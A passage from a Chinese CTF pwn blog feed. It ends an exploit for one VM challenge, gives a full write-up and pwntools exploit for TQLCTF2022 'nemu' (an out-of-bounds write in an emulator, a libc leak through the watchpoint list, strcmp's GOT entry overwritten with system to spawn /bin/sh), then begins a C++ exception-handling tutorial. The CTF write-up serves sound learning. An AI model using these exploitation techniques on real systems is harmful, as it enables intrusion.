88&#xA;opcode&amp;#43;= store(0,0x302db) # rbp val&#xA;opcode&amp;#43;= mov(0,dest)&#xA;#0x1815f0  $fs_base - 0x140&#xA;opcode&amp;#43;= store(0,0x302be) # rbp val &#xA;opcode&amp;#43;= mov(0,next(libc.search(b&amp;#39;/bin/sh&amp;#39;)))&#xA;#0x1815f8  $fs_base - 0x138&#xA;opcode&amp;#43;= store(0,0x302bf) # rbp val&#xA;opcode&amp;#43;= exit_f()&#xA;sla(b&amp;#39;code size:\n&amp;#39;,str(len(opcode)))&#xA;sla(b&amp;#39;memory count:\n&amp;#39;,str(0x2000000000030000))&#xA;sl(opcode)&#xA;dbg()&#xA;sla(b&amp;#39;continue?&amp;#39;, b&amp;#34;bye bye\x00&amp;#34;)&#xA;&#xA;&#xA;itr()&#xA;# p/x $fs_base&#xA;&#xA;# opcode_ptr memory_ptr stack_ptr opcodesize mesize&#xA;# sbase 0x5040&#xA;&#xA;#stack sp&#xA;#sbase 0x5090&#xA;&#xA;# dq 0x181760 &amp;#43; memory_ptr&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;tqlctf2022_nemu&#34;&gt;&lt;span&gt;TQLCTF2022_nemu&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#tqlctf2022_nemu&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;blockquote&gt;&#xA;&lt;p&gt;别的师傅评价：一个完全无限制的越界读写问题。但是看似简单，读写操作的时候还需要经过一些检查。很值得一做。很适合作为VM pwn的入门题目仔细分析(正好也有源码，漏洞很经典)&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;这题主要考点：&lt;code&gt;理解⼀个模拟器及调试器的整体架构&lt;/code&gt;，给了源码&lt;/p&gt;&#xA;&lt;p&gt;交互：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;help:查看所有指令description&#xA;si:单步执行1次&#xA;si 2:单步执行2次&#xA;c:一直执行&#xA;info r:查看寄存器&#xA;info w:查看断点&#xA;x 0x100005 :查看内容&#xA;x 4 0x100000：查看4个dword内容&#xA;w *0x100000：设置watch point&#xA;d 1:删除第一个watch point&#xA;set &amp;lt;地址&amp;gt; &amp;lt;数据&amp;gt;：修改数据&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里比较重要的就是&lt;code&gt;guest_to_host&lt;/code&gt;这个宏&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;uint32_t vaddr_read(vaddr_t addr, int len) {&#xA;  return paddr_read(addr, len);&#xA;}&#xA;&#xA;uint32_t paddr_read(paddr_t addr, int len) {&#xA;  return pmem_rw(addr, uint32_t) &amp;amp; (~0u &amp;gt;&amp;gt; ((4 - len) &amp;lt;&amp;lt; 3));&#xA;}&#xA;&#xA;&#xA;#define pmem_rw(addr, type) *(type *)({\&#xA;    guest_to_host(addr); \&#xA;    })&#xA;&#xA;/* convert the guest physical address in the guest program to host virtual address in NEMU */&#xA;#define guest_to_host(p) ((void *)(pmem &amp;#43; (unsigned)p))&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个宏的&lt;code&gt;p&lt;/code&gt;是真实的物理地址&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;pwndbg&amp;gt; disass vaddr_read&#xA;Dump of assembler code for function vaddr_read:&#xA;   0x0000000000406ee0 &amp;lt;&amp;#43;0&amp;gt;:     mov    ecx,0x4&#xA;   0x0000000000406ee5 &amp;lt;&amp;#43;5&amp;gt;:     mov    edi,edi&#xA;   0x0000000000406ee7 &amp;lt;&amp;#43;7&amp;gt;:     mov    eax,0xffffffff&#xA;   0x0000000000406eec &amp;lt;&amp;#43;12&amp;gt;:    sub    ecx,esi&#xA;   0x0000000000406eee &amp;lt;&amp;#43;14&amp;gt;:    shl    ecx,0x3&#xA;   0x0000000000406ef1 &amp;lt;&amp;#43;17&amp;gt;:    shr    eax,cl&#xA;   0x0000000000406ef3 &amp;lt;&amp;#43;19&amp;gt;:    and    eax,DWORD PTR [rdi&amp;#43;0x6a3b80]&#xA;   0x0000000000406ef9 &amp;lt;&amp;#43;25&amp;gt;:    ret&#xA;End of assembler dump.&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查看汇编可以看到&lt;code&gt;0x6a3b80&lt;/code&gt;就是&lt;code&gt;p&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;pwndbg&amp;gt; dq 0x6a3b80&amp;#43;0x100000&#xA;0x7a3b80 &amp;lt;pmem&amp;#43;1048576&amp;gt;:        0x0027b900001234b8      0x0441c76601890010&#xA;0x7a3b90 &amp;lt;pmem&amp;#43;1048592&amp;gt;:        0x6600000002bb0001      0x01ffffe0009984c7&#xA;0x7a3ba0 &amp;lt;pmem&amp;#43;1048608&amp;gt;:        0x00d600000000b800      0x0000000000000000&#xA;0x7a3bb0 &amp;lt;pmem&amp;#43;1048624&amp;gt;:        0x0000000000000000      0x0000000000000000&#xA;&#xA;100000:   b8 34 12 00 00                        movl $0x1234,%eax&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里也对应上了&lt;/p&gt;&#xA;&lt;p&gt;而这里也没有对于边界的检查，所以可以进行越界读，set可以进行越界写&lt;/p&gt;&#xA;&lt;p&gt;这里需要通过watchpoint去泄露&lt;/p&gt;&#xA;&lt;p&gt;watchpoint数据结构&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;typedef struct watchpoint {&#xA;  int NO;&#xA;  struct watchpoint *next;&#xA;&#xA;  /* TODO: Add more members if necessary */&#xA; char exp[30];&#xA; uint32_t old_val;&#xA; uint32_t new_val;&#xA;&#xA;} WP;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;考虑结构体内存对齐，实际上的内存结构：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;typedef struct watchpoint {&#xA;    int NO;                     // Offset: 0x0, Size: 0x4 bytes&#xA;    struct watchpoint *next;    // Offset: 0x4, Size: 0x8 bytes&#xA;&#xA;    /* TODO: Add more members if necessary */&#xA;    char exp[30];               // Offset: 0x10, Size: 0x1e bytes&#xA;    uint32_t old_val;           // Offset: 0x30, Size: 4 bytes&#xA;    uint32_t new_val;           // Offset: 0x34, Size: 4 bytes&#xA;} WP;&#xA;//总共0x38&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;list_watchpoint:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;void list_watchpoint(){&#xA;    WP *head2 = head;&#xA;    if(head == NULL) {&#xA;        printf(&amp;#34;No watch pint to delete\n&amp;#34;);&#xA;        return;&#xA;    }&#xA;    printf(&amp;#34;NO Expr               Old Value               New Value\n&amp;#34;);&#xA;    while(head2){&#xA;        printf(&amp;#34;%d  %-18s %#x               %#x\n&amp;#34;,head2-&amp;gt;NO,head2-&amp;gt;exp,head2-&amp;gt;old_val,head2-&amp;gt;new_val);&#xA;        head2 = head2-&amp;gt;next;&#xA;    }&#xA;    return;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;pwndbg&amp;gt; p &amp;amp;head&#xA;$7 = (WP **) 0x86a3fc8 &amp;lt;head&amp;gt;&#xA;&#xA;pwndbg&amp;gt; x/8gx 0x60f018-0x20&#xA;0x60eff8:       0x0000000000000000      0x000000000060ee18&#xA;0x60f008:       0x00007d7a583572e0      0x00007d7a583332f0&#xA;0x60f018 &amp;lt;__snprintf_chk@got.plt&amp;gt;:      0x00007d7a58137d30      0x00007d7a580add30&#xA;0x60f028 &amp;lt;putchar@got[plt]&amp;gt;:    0x0000000000401506      0x0000000000401516&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里要让libc地址位于head+0x30处，就能通过old_val  new_val泄露出libc地址&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;#pwndbg&amp;gt; p/x 0x86a3fc8-0x6a3b80&#xA;#$1 = 0x8000448&#xA;sl(b&amp;#39;set 0x8000448 0x60eff0&amp;#39;)&#xA;# dbg()&#xA;sl(b&amp;#39;info w&amp;#39;)&#xA;ru(b&amp;#39;New Value&amp;#39;)&#xA;ru(b&amp;#39;0x&amp;#39;)&#xA;libc_low = int(p.recv(8),16)&#xA;ru(b&amp;#39;0x&amp;#39;)&#xA;libc_high = int(p.recv(4),16)&#xA;lg(&amp;#34;libc_high&amp;#34;)&#xA;lg(&amp;#34;libc_low&amp;#34;)&#xA;libc_base = (libc_high&amp;lt;&amp;lt;32) | libc_low&#xA;lg(&amp;#34;libc_base&amp;#34;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;写入system：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;WP *new_wp(){&#xA;    if(free_ == NULL){&#xA;        assert(0);&#xA;    }&#xA;    //unlink&#xA;    WP *temp = free_;&#xA;    free_ = free_-&amp;gt;next;&#xA;    //insert&#xA;    temp-&amp;gt;next = NULL;&#xA;    return temp;&#xA;}&#xA;&#xA;void set_watchpoint(char *args){&#xA;    bool flag = true;&#xA;  uint32_t val = expr(args, &amp;amp;flag);&#xA;&#xA;  if (!flag) {&#xA;    printf(&amp;#34;You input an invalid expression, failed to create watchpoint!&amp;#34;);&#xA;    return ;&#xA;  }  &#xA;&#xA;  WP *wp = new_wp();&#xA;  wp-&amp;gt;old_val = val;&#xA;  memcpy(wp-&amp;gt;exp, args, 30);&#xA;  //...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里可以看到：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;WP *wp = free_;&#xA;memcpy(wp-&amp;gt;exp, args, 30);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;也就是&lt;code&gt;w 0xdeedbeef&lt;/code&gt;的时候，会把&lt;code&gt;0xdeedbeef&lt;/code&gt;写入&lt;code&gt;free_+0x30&lt;/code&gt;处&lt;/p&gt;&#xA;&lt;p&gt;这样我们只需要去set free_再w就能实现任意写&lt;/p&gt;&#xA;&lt;p&gt;这里的思路是写strcmp的got为system，在&lt;code&gt;ui_mainloop&lt;/code&gt;中,strcmp的第一个参数就是我们输入的命令，输入binsh就行&lt;/p&gt;&#xA;&lt;p&gt;exp:&lt;/p&gt;&#xA;&lt;p&gt;这里我用的本地的libc&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from pwn import *&#xA;context.terminal = [&amp;#34;tmux&amp;#34;, &amp;#34;splitw&amp;#34;, &amp;#34;-h&amp;#34;]&#xA;context(os=&amp;#39;linux&amp;#39;,arch=&amp;#39;amd64&amp;#39;,log_level=&amp;#39;debug&amp;#39;)&#xA;&#xA;address = &amp;#39;./pwn&amp;#39;&#xA;# address = &amp;#39;./pwn_patched&amp;#39;&#xA;elf = ELF(address)&#xA;libc = elf.libc&#xA;&#xA;#-----------------------------------------------------------------&#xA;s       = lambda data               :p.send(data)&#xA;ss      = lambda data               :p.send(str(data))&#xA;sa      = lambda delim,data         :p.sendafter(str(delim), data)&#xA;sl      = lambda data               :p.sendline(data)&#xA;sls     = lambda data               :p.sendline(str(data))&#xA;sla     = lambda delim,data         :p.sendlineafter(delim, data)&#xA;r       = lambda num                :p.recv(num)&#xA;ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)&#xA;itr     = lambda                    :p.interactive()&#xA;uu32    = lambda data               :u32(data.ljust(4,b&amp;#39;\x00&amp;#39;))&#xA;uu64    = lambda data               :u64(data.ljust(8,b&amp;#39;\x00&amp;#39;))&#xA;# lg      = lambda s,addr&#x9;&#x9;        : log.info(&amp;#39;\033[1;31;40m %s --&amp;gt; 0x%x \033[0m&amp;#39; % (s,addr))&#xA;lg      = lambda s&#x9;&#x9;&#x9;        : log.info(&amp;#39;\033[1;31;40m %s --&amp;gt; 0x%x \033[0m&amp;#39; % (s, eval(s)))&#xA;l64     = lambda                    :u64(p.recvuntil(&amp;#34;\x7f&amp;#34;)[-6:].ljust(8,b&amp;#34;\x00&amp;#34;))&#xA;l32     = lambda                    :u32(p.recvuntil(&amp;#34;\xf7&amp;#34;)[-4:].ljust(4,b&amp;#34;\x00&amp;#34;))&#xA;r64     = lambda                    :u64(p.recv(6).ljust(8,b&amp;#39;\x00&amp;#39;))&#xA;ir64    = lambda                    :int(p.recv(14),16)&#xA;#-----------------------------------------------------------------&#xA;gdbscript = \&#xA;&amp;#34;&amp;#34;&amp;#34;&#xA;    &#xA;    c&#xA;&amp;#34;&amp;#34;&amp;#34;&#xA;if len(sys.argv) &amp;gt; 1 and sys.argv[1] == &amp;#34;r&amp;#34;:&#xA;    p = remote(&amp;#34;host.docker.internal&amp;#34;,9999 )&#xA;elif len(sys.argv) &amp;gt; 1 and sys.argv[1] == &amp;#34;d&amp;#34;:&#xA;    p = gdb.debug(address, gdbscript = gdbscript)&#xA;else:&#xA;    p = process(address)&#xA;&#xA;def dbg():&#xA;    gdb.attach(p)&#xA;    # gdb.attach(p, gdbscript=gdbscript)&#xA;    # pause()&#xA;&#xA;ru(b&amp;#39;(nemu) &amp;#39;)&#xA;# dbg()&#xA;&#xA;&#xA;#pwndbg&amp;gt; p/x 0x86a3fc8-0x6a3b80&#xA;#$1 = 0x8000448&#xA;sl(b&amp;#39;set 0x8000448 0x60eff0&amp;#39;)&#xA;&#xA;sl(b&amp;#39;info w&amp;#39;)&#xA;ru(b&amp;#39;New Value&amp;#39;)&#xA;ru(b&amp;#39;0x&amp;#39;)&#xA;libc_low = int(p.recv(8),16)&#xA;ru(b&amp;#39;0x&amp;#39;)&#xA;libc_high = int(p.recv(4),16)&#xA;lg(&amp;#34;libc_high&amp;#34;)&#xA;lg(&amp;#34;libc_low&amp;#34;)&#xA;libc_base = (libc_high&amp;lt;&amp;lt;32) | libc_low&#xA;libc_base = libc_base -0xadd30&#xA;lg(&amp;#34;libc_base&amp;#34;)&#xA;sl(b&amp;#39;set 0x8000448 0&amp;#39;)&#xA;# dbg()&#xA;&#xA;system = libc_base &amp;#43; 0x58750&#xA;strcmp_got = 0x60F0F0&#xA;# pwndbg&amp;gt; p &amp;amp;free_&#xA;# $1 = (WP **) 0x86a3fc0 &amp;lt;free_&amp;gt;&#xA;# pwndbg&amp;gt; p/x 0x86a3fc0 - 0x6a3b80&#xA;# $2 = 0x8000440&#xA;sl(b&amp;#39;set 0x8000440 0x60f0c0&amp;#39;)&#xA;sl(b&amp;#39;w &amp;#39;&amp;#43;hex(system).encode())&#xA;sl(b&amp;#39;/bin/sh&amp;#39;)&#xA;&#xA;&#xA;# 0x6a3b80&#xA;itr()&#xA;# x/8gx 0x60f018-0x20&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;&#xA;&lt;p&gt;做下来，有别于传统的题，又挺有意思的一道题&lt;/p&gt;&#xA;&lt;/blockquote&gt;</description>
    </item>
    <item>
      <title>C&#43;&#43;pwn之异常处理</title>
      <link>http://localhost:1313/posts/cpp_pwn/</link>
      <pubDate>Thu, 28 Aug 2025 21:51:40 +0800</pubDate>
      <guid>http://localhost:1313/posts/cpp_pwn/</guid>
      <category domain="http://localhost:1313/categories/pwn/">Pwn</category>
      <description>&lt;h2 class=&#34;heading-element&#34; id=&#34;异常处理机制&#34;&gt;&lt;span&gt;异常处理机制&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%bc%82%e5%b8%b8%e5%a4%84%e7%90%86%e6%9c%ba%e5%88%b6&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;基础语法&#34;&gt;&lt;span&gt;基础语法&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%9f%ba%e7%a1%80%e8%af%ad%e6%b3%95&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;异常机制中主要的几个关键字：&lt;code&gt;throw&lt;/code&gt; 抛出异常，&lt;code&gt;try-catch&lt;/code&gt;响应异常&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;#include &amp;lt;iostream&amp;gt;&#xA;using namespace std;&#xA;&#xA;int main() {&#xA;    int x, y;&#xA;    cout &amp;lt;&amp;lt; &amp;#34;请输入两个整数（x y）：&amp;#34;;&#xA;    cin &amp;gt;&amp;gt; x &amp;gt;&amp;gt; y;&#xA;&#xA;    try {&#xA;        if (y == 0) {&#xA;            // 抛出异常：除数不能为 0&#xA;            throw runtime_error(&amp;#34;除数不能为 0！&amp;#34;);&#xA;        }&#xA;        cout &amp;lt;&amp;lt; &amp;#34;结果: &amp;#34; &amp;lt;&amp;lt; x / y &amp;lt;&amp;lt; endl;&#xA;    } catch (const runtime_error&amp;amp; e) {&#xA;        // 捕获并处理异常&#xA;        cout &amp;lt;&amp;lt; &amp;#34;发生异常：&amp;#34; &amp;lt;&amp;lt; e.what() &amp;lt;&amp;lt; endl;&#xA;    }&#xA;&#xA;    cout &amp;lt;&amp;lt; &amp;#34;程序继续运行...&amp;#34; &amp;lt;&amp;lt; endl;&#xA;    return 0;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;输入 &lt;code&gt;10 2&lt;/code&gt; ， 输出 &lt;code&gt;结果: 5&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;输入&lt;code&gt;10 0&lt;/code&gt;，会输出&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;发生异常：除数不能为 0！&#xA;程序继续运行...&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;trycatch&#34;&gt;&lt;span&gt;try、catch&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#trycatch&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;pre&gt;&lt;code&gt; try {&#xA; &#x9;program-statements&#xA; } catch (exception-declaration) {&#xA; &#x9;handler-statements&#xA; } catch (exception-declaration) {&#xA; &#x9;handler-statements&#xA; } // .. . &lt;/code&gt;&lt;/pre&gt;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;try块&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;用 &lt;code&gt;try { ... }&lt;/code&gt; 包裹可能产生异常的代码。&lt;/li&gt;&#xA;&lt;li&gt;在 try 内声明的变量，作用域仅限 try 内，catch 中不能访问。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;catch块&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;当 try 内抛出异常时，运行时会寻找匹配的 catch。&lt;/li&gt;&#xA;&lt;li&gt;一旦某个 catch 处理完，程序会继续执行 整个 try-catch 之后的语句&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;函数退出与栈展开&#34;&gt;&lt;span&gt;函数退出与栈展开&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%87%bd%e6%95%b0%e9%80%80%e5%87%ba%e4%b8%8e%e6%a0%88%e5%b1%95%e5%bc%80&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;在复杂的程序中，可能在一个&lt;code&gt;try&lt;/code&gt;语句中嵌套另一个&lt;code&gt;try&lt;/code&gt;语句&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;stack unwinding（栈展开）：&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;当一个异常被抛出，如果没有对应的&lt;code&gt;catch&lt;/code&gt;能处理，就会终止这个函数，并返回给调用者&lt;/li&gt;&#xA;&lt;li&gt;调用者继续查找自己的 &lt;code&gt;try...catch&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;如果仍未找到 → 再返回上层调用者 … 一直往上追溯&lt;/li&gt;&#xA;&lt;li&gt;如果最终没找到任何合适的 catch ，就会调用标准库函数 &lt;code&gt;terminate()&lt;/code&gt;，程序直接退出&lt;/li&gt;&#xA;&lt;li&gt;如果在某一层找到了匹配的&lt;code&gt;catch&lt;/code&gt;，那么程序就会进入这个&lt;code&gt;catch&lt;/code&gt;块执行，当 &lt;code&gt;catch&lt;/code&gt; 执行完，程序会跳到该 &lt;code&gt;try-catch&lt;/code&gt; 的最后一个 catch 之后继续执行。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;#include &amp;lt;iostream&amp;gt;&#xA;#include &amp;lt;stdexcept&amp;gt;&#xA;using namespace std;&#xA;&#xA;void funcC() {&#xA;    cout &amp;lt;&amp;lt; &amp;#34;进入 funcC&amp;#34; &amp;lt;&amp;lt; endl;&#xA;    throw runtime_error(&amp;#34;funcC 出现异常&amp;#34;); // 抛出异常&#xA;    cout &amp;lt;&amp;lt; &amp;#34;funcC 正常结束&amp;#34; &amp;lt;&amp;lt; endl;       // 不会执行&#xA;}&#xA;&#xA;void funcB() {&#xA;    cout &amp;lt;&amp;lt; &amp;#34;进入 funcB&amp;#34; &amp;lt;&amp;lt; endl;&#xA;    funcC(); // 调用 funcC&#xA;    cout &amp;lt;&amp;lt; &amp;#34;funcB 正常结束&amp;#34; &amp;lt;&amp;lt; endl; // 不会执行&#xA;}&#xA;&#xA;void funcA() {&#xA;    cout &amp;lt;&amp;lt; &amp;#34;进入 funcA&amp;#34; &amp;lt;&amp;lt; endl;&#xA;    try {&#xA;        funcB(); // 调用 funcB&#xA;    } catch (const runtime_error&amp;amp; e) {&#xA;        cout &amp;lt;&amp;lt; &amp;#34;捕获异常: &amp;#34; &amp;lt;&amp;lt; e.what() &amp;lt;&amp;lt; endl;&#xA;    }&#xA;    cout &amp;lt;&amp;lt; &amp;#34;funcA 继续执行&amp;#34; &amp;lt;&amp;lt; endl;&#xA;}&#xA;&#xA;int main() {&#xA;    funcA();&#xA;    cout &amp;lt;&amp;lt; &amp;#34;main 继续执行&amp;#34; &amp;lt;&amp;lt; endl;&#xA;    return 0;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;输出结果：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;进入 funcA&#xA;进入 funcB&#xA;进入 funcC&#xA;捕获异常: funcC 出现异常&#xA;funcA 继续执行&#xA;main 继续执行&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;raii&#34;&gt;&lt;span&gt;RAII&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#raii&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  